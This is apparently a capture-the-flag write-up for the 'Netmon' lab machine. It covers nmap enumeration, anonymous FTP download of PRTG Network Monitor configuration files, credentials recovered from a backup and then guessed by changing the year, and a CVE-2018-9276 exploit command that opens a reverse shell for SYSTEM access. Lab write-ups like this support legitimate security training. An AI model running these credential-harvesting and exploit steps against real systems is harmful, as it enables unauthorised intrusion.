# About
Netmon is an easy difficulty Windows box with simple enumeration and exploitation. PRTG is running, and an FTP server with anonymous access allows reading of PRTG Network Monitor configuration files. The version of PRTG is vulnerable to RCE which can be exploited to gain a SYSTEM shell. 

## Enumeration
`nmap -A -T4 -p- 10.129.230.176
```
PORT      STATE    SERVICE      VERSION
21/tcp    open     ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
80/tcp    open     http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1699/tcp  filtered rsvp-encap-2
1887/tcp  filtered filex-lport
4707/tcp  filtered unknown
5985/tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     msrpc        Microsoft Windows RPC
49665/tcp open     msrpc        Microsoft Windows RPC
49666/tcp open     msrpc        Microsoft Windows RPC
49667/tcp open     msrpc        Microsoft Windows RPC
49668/tcp open     msrpc        Microsoft Windows RPC
49669/tcp open     msrpc        Microsoft Windows RPC
```
### FTP Anon Login
![](Images/Pasted%20image%2020250416221722.png)

Under the \Windows directory I found 
![](Images/Pasted%20image%2020250416221858.png)

Version confirmation
`PRTG Network Monitor 18.1.37.13946`
C:\ProgramData\Paessler is the default directory for the application.
![](Images/Pasted%20image%2020250416222803.png)

Lets grab the whole directory to read locally.
`wget -r ftp://10.129.230.176/ProgramData/Paessler`

Also Anon FTP allowed us to get the user flag
![](Images/Pasted%20image%2020250416222632.png)

In the directory seems to be an old backup of the configuration I wonder if we can find something
![](Images/Pasted%20image%2020250416223001.png)

Bingo
prtgadmin:PrTg@dmin2018

![](Images/Pasted%20image%2020250416223025.png)

![](Images/Pasted%20image%2020250416223453.png)

Since this is an old configuration, typical users like changing the year when they have to adjust passwords so lets try the next year in line.
`prtgadmin:PrTg@dmin2019`
![](Images/Pasted%20image%2020250416223526.png)

## Exploitation
![](Images/Pasted%20image%2020250416222123.png)

The only promising one looks like it requires authentication so I will probably need to enumerate further
prtgadmin:PrTg@dmin2019
https://github.com/A1vinSmith/CVE-2018-9276

`./exploit.py -i 10.129.230.176 -p 80 --lhost 10.10.14.251 --lport 4444 --user prtgadmin --password PrTg@dmin2019`
![](Images/Pasted%20image%2020250416223859.png)

That was a quick easy root

![](Images/Pasted%20image%2020250416223928.png)

![](Images/Pasted%20image%2020250416223954.png)
